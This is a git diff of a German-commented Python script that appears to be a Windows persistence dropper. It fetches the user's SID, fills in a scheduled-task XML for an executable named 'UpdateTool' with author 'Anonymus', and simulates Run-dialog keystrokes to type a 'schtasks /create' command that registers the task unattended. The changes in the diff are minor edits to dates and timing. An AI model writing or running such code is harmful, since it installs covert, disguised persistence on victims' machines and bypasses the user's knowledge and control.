@@ -30,7 +30,7 @@ class winvars:
     host = socket.gethostname()
     hostuser = host + '\\' + username
     # user sid zu python holen (import subprocess)
-    raw_mysid = subprocess.Popen("wmic useraccount where name=\"%username%\" get sid", shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    raw_mysid = subprocess.Popen("wmic useraccount where name=\"%username%\" get sid", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     (sid_out, sid_err) = raw_mysid.communicate()
     mysid = str(sid_out[48:91], 'utf-8')
     pass
@@ -44,7 +44,7 @@ downloadname = "UpdateTool.exe"
 xmlname = "UpdateTool.xml"
 uriname = r'\UpdateTool'
 #erweiterte vars gestalten
-
+nowdate = time.strftime("%G-%m-%dT%H:%M:%S")
 # newpath festlegen
 newpath_home = winvars.homepath + r'\.UpdateTool'
 newpath_tmp = winvars.tmp + r'\UpdateTool'
@@ -67,7 +67,7 @@ if os.path.exists(newpath_tmp + '\\' + xmlname):
 xml = r'''<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
-    <Date>2021-04-28T07:52:50.2538139</Date>
+    <Date>now_date</Date>
     <Author>Anonymus</Author>
     <URI>uri_name</URI>
   </RegistrationInfo>
@@ -121,8 +121,9 @@ xml = xml.replace("hostuser", winvars.hostuser)
 xml = xml.replace("user_sid", winvars.mysid)
 xml = xml.replace("exe_path", datapath)
 xml = xml.replace("uri_name", uriname)
+xml = xml.replace("now_date", nowdate)
 
-os.system(r'cmd /c ' + writer(xml) )
+os.system(r'cmd /c ' + writer(xml))
 print('xml datei geschrieben')
 
 time.sleep(0.5)
@@ -135,19 +136,16 @@ keyboard.press('r')
 keyboard.release('r')
 keyboard.release(Key.cmd)
 
-time.sleep(0.3)
+time.sleep(0.5)
 
 keyboard.type('cmd')
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
-
 time.sleep(1)
-
 keyboard.type(r'schtasks /create /tn "UpdateTool" /xml "' + newpath_tmp + '\\' + xmlname)
-time.sleep(0.1)
+time.sleep(0.01)
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
-time.sleep(5)
 keyboard.type('exit')
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
